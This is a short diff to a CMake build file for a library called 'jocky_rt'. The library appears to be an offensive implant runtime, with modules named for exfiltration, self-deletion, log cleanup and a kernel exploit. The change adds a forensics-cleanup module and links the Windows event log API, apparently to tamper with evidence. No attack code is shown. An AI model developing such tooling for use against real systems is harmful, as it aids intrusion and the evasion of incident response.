@@ -17,6 +17,7 @@ set(RUNTIME_SOURCES
     exfil/exfil.c
     cleanup/self_delete.c
     cleanup/logs.c
+    cleanup/forensics.c
 )
 
 # Platform-specific filtering
@@ -32,6 +33,7 @@ if(NOT WIN32)
         execution/driver_interact.c
         exploitation/kernel_exploit.c
         exfil/exfil.c
+        cleanup/forensics.c
     )
 endif()
 
@@ -40,7 +42,7 @@ add_library(jocky_rt STATIC ${RUNTIME_SOURCES})
 target_include_directories(jocky_rt PUBLIC include)
 
 if(WIN32)
-    target_link_libraries(jocky_rt PUBLIC ntdll winhttp dnsapi)
+    target_link_libraries(jocky_rt PUBLIC ntdll winhttp dnsapi wevtapi)
 endif()
 
 # Example: build a test executable
